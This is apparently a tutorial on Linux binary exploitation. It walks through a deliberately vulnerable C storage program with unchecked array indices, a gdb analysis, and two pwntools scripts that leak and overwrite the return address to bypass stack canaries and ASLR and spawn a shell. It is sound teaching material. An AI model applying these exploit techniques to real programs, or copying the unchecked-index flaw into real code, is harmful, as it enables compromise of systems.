# Introduction to Linux pwn - Overriding the return address

[Last time](https://github.com/yo-yo-yo-jbo/linux_pwn_intro) we described stack-smashing by overriding a variable, but this time we're going a bit more serious and overriding the return address.  
For that, I will introduce with another nice way of defeating stack cookies on the way. Let's jump right into it!

```c
#include <stdio.h>
#include <unistd.h>

#define LEN (10)

static
void
give_shell(void)
{
        printf("woot!\n");
        execve("/bin/sh", NULL, NULL);
}

static
void
storage()
{
        int arr[LEN] = { 0 };
        char menu_choice = 0;
        int index_choice = 0;

        setbuf(stdout, NULL);
        printf("Welcome to my awesome storage program!\n");

        // Handling menu forever
        for (;;)
        {
                // Getting the menu choice
                printf("Enter [R] to read, [W] to write or [Q] to quit: ");
                scanf(" %c", &menu_choice);

                // Handling quits
                if (menu_choice == 'Q')
                {
                        printf("Quitting.\n");
                        break;
                }

                // Handling wrong choices
                if ((menu_choice != 'R') && (menu_choice != 'W'))
                {
                        printf("Wrong choice.\n");
                        continue;
                }

                // Getting the index with a bounds check
                printf("Enter the array index: ");
                scanf("%d", &index_choice);

                // Handling reads
                if (menu_choice == 'R')
                {
                        printf("Value: %d\n", arr[index_choice]);
                        continue;
                }

                // Handling writes
                printf("Enter value: ");
                scanf("%d", arr+index_choice);
        }
}

int main()
{
        storage();
        return 0;
}
```

Well, let's analyze it!
- We have a "storage system" which is really just an array of 10 integers, where we can read and write freely.
- The index is never validated, which is very problematic - we can give either negative values or incides that are out-of-bounds!

This kind of condition is amazing for exploitation since we have two "primitives":
1. `read-what-where` - we can read from arbitrary addresses.
2. `write-what-where` - we can write arbitrary values to arbitrary addresses.

In our case the addresses are relative to the stack, but that's not a huge concern, as we will shortly see.
These strong primitives will help us take control of the program, as our ultimate goal is invoking the `give_shell` function.

## Exploitation by overriding the return address
Let us examine the security mitigations:

```shell
$ checksec ./chall
[*] '/home/jbo/pwn_2/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We can write arbitrary values to addresses relative to the `arr` variable (in the stack) - what should we do?  
Normally, a modern exploit would have to deal with certain mitigations:
- `Stack cookies` - we could use our read primitive to read the stack cookie (it will be in indices `10` and `11` since it's a 64-bit value, so it's spread over two `int` values) - but do we really need to? Stack cookies are great when it comes to protecting linear stack buffer overflows, but in our case we decide on the index freely, so we can just "skip over" the cookie!
- `NX (Non-eXecutable)` - that means the stack is non-executable, which is not a huge deal for us, as we plan on calling `give_shell` directly. Normally, `NX` on its own is pretty weak, unless it comes with `ASLR`.
- `PIE (Position-Independent Executable)` - means that the executable is position independent, so it could be loaded to any address. `PIE` is basically `ASLR` for the executable itself, as in the past, the executable image was position-dependent (since the process has the entire address space) and loadable modules (`so` files) were `PIC (Position-Independent-Code`). These days `PIE` is the default option. Generally, `PIE` is a part of `ASLR` ([Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization)). `ALSR` is an in-depth security feature that makes loadable modules and the main executable load at different addresses at different executions. Its level of granularity and implementation depends much on the operating system as well as the compilation flags, and in our case, it means that we do not know the absolute address of `give_shell` ahead of time.

To bypass ASLR, we could take two approaches, depending on the primitives we have:
1. Defeating ASLR with a `leak`. Usually `ASLR` leaks are another type of vulnerability, but in our case it's easy - we can read the return address from the stack using our awesome read primitive.
2. Doing a partial write. This approach is sometimes very tailored to specific situations - in our case we can write in a 4-byte granularity so we won't benefit a lot from it, but we will try to demonstrate that too.

First though - let us find the return address dynamically!

```
gdb ./chall
(gdb) b *stroage
Breakpoint 1 at 0x121c
(gdb) r
Breakpoint 1, 0x000055555555521c in storage ()
(gdb) x/gx $rsp
0x7fffffffe348: 0x00005555555553c6
(gdb) u 0x00005555555553c6
Function "0x00005555555553c6" not defined.
(gdb) x/3i 0x00005555555553c6
   0x5555555553c6 <main+18>:    mov    eax,0x0
   0x5555555553cb <main+23>:    pop    rbp
   0x5555555553cc <main+24>:    ret
(gdb) bt
#0  0x000055555555521c in storage ()
#1  0x00005555555553c6 in main ()
```

As you can see, when we enter the `storage` function, the return address is pushed on the stack and can be read from `rsp` - in my run it's `0x00005555555553c6` but due to `ASLR` it might have different values in different runs. We clearly can disassemble a few instructions from that value to see that it's coming from `main`. Another way I show that is by running the `bt` (backtrace) command that clearly shows the return address to `main`. So, if we split `0x00005555555553c6` to two numbers I'd be expecting to see `1431655366` (which is `0x555553c6`) and `21845` (which is `0x5555`). We could either conclude statically or play around and conclude this value lives in indices `14` and `15`:

```
Enter [R] to read, [W] to write or [Q] to quit: R
Enter the array index: 14
Value: 1431655366
Enter [R] to read, [W] to write or [Q] to quit: R
Enter the array index: 15
Value: 21845
```

That's awesome, since reading the return value lets us conclude the position of all code in the main module - `main` as well as `give_shell`!
Let's examine:

```
(gdb) info functions give_shell
All functions matching regular expression "give_shell":

Non-debugging symbols:
0x00005555555551e9  give_shell
```

So, we know the distance between the return address (`0x00005555555553c6`) and `give_shell` (`0x00005555555551e9`) - just take the return address and substract `0x1dd`.  
So, our strategy is simple:
1. Read indices `14` and `15` to condlude the return address.
2. Substract `0x1dd` from it.
3. Write to indices `14` and `15`.
4. Trigger (by typing `Q`').

```python
#!/usr/bin/env python3
from pwn import *

def read_int(p, idx):
    p.recvuntil(b': ')
    p.send(b'R\n')
    p.recvuntil(b': ')
    p.send(str(idx).encode() + b'\n')
    return int(p.recvline().decode().strip().replace('Value: ', '')) & 0xFFFFFFFF

def write_int(p, idx, val):
    p.recvuntil(b': ')
    p.send(b'W\n')
    p.recvuntil(b': ')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b': ')
    p.send(str(val).encode() + b'\n')

def read_ret(p):
    return (read_int(p, 15) << 32) | read_int(p, 14)

def write_ret(p, val):
    p_val = p64(val)
    lo, hi = u32(p_val[:4]), u32(p_val[4:])
    write_int(p, 15, hi)
    write_int(p, 14, lo)

def trigger_quit(p):
    p.recvuntil(b': ')
    p.send(b'Q\n')
    p.interactive()

p = process('./chall')
ret_addr = read_ret(p)
log.info(f'Concluded return address: 0x{ret_addr:02x}')
ret_addr -= 0x1dd
write_ret(p, ret_addr)
log.info(f'Written new return address: 0x{ret_addr:02x}')
log.info('Triggering')
trigger_quit(p)
```

I think the code is quite easy to understand, but here it goes:
- `read_int` reads a 4-byte integer in the given index, and represents our `read primitive`.
- `write_int` reads a 4-byte integer in the given index, and represents our `write primitive`.
- `read_ret` simply reads the return address by calling `read_int` on indices `14` and `15` as discussed.
- `write_ret` does the same thing by writing in two parts.
- `trigger_quit` simply sends a `Q`.
- The main functionality reads the return address, substracts `0x1dd`, writes the new return address and triggers the return.

Running it results in a success:

```
$ ./solve1.py
[+] Starting local process './chall': pid 45807
[*] Concluded return address: 0x611a411c93c6
[*] Written new return address: 0x611a411c91e9
[*] Triggering
[*] Switching to interactive mode
Quitting.
woot!
$ id
uid=1000(jbo) gid=1000(jbo) groups=1000(jbo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),142(libvirt)
```

In certain situations, overriding the return address slightly might also work - and in this case we could just read the lower part of the return address, as the return address to `main` and `give_shell` are so close. Therefore, we could be slighly lazier:

```python
#!/usr/bin/env python3
from pwn import *

def read_int(p, idx):
    p.recvuntil(b': ')
    p.send(b'R\n')
    p.recvuntil(b': ')
    p.send(str(idx).encode() + b'\n')
    return int(p.recvline().decode().strip().replace('Value: ', '')) & 0xFFFFFFFF

def write_int(p, idx, val):
    p.recvuntil(b': ')
    p.send(b'W\n')
    p.recvuntil(b': ')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b': ')
    p.send(str(val).encode() + b'\n')

def read_ret_lo(p):
    return read_int(p, 14)

def write_ret_lo(p, val):
    write_int(p, 14, val)

def trigger_quit(p):
    p.recvuntil(b': ')
    p.send(b'Q\n')
    p.interactive()

p = process('./chall')
ret_addr_lo = read_ret_lo(p)
log.info(f'Concluded return address low part: 0x{ret_addr_lo:02x}')
ret_addr_lo -= 0x1dd
write_ret_lo(p, ret_addr_lo)
log.info(f'Written new return address low part: 0x{ret_addr_lo:02x}')
log.info('Triggering')
trigger_quit(p)
```

Note how here we just need index `14`. In some case this idea can work amazingly well, e.g. if overriding one or two bytes in the return address.

## Summary
This is the second in a very long series on intoruction to binary exploitation.  
We learned how to override the return address and that in some cases stack cookies could be ineffective. We also learned a bit about `ASLR`, and developed a full exploit. Neat!  
Stay tuned!

Jonathan Bar Or
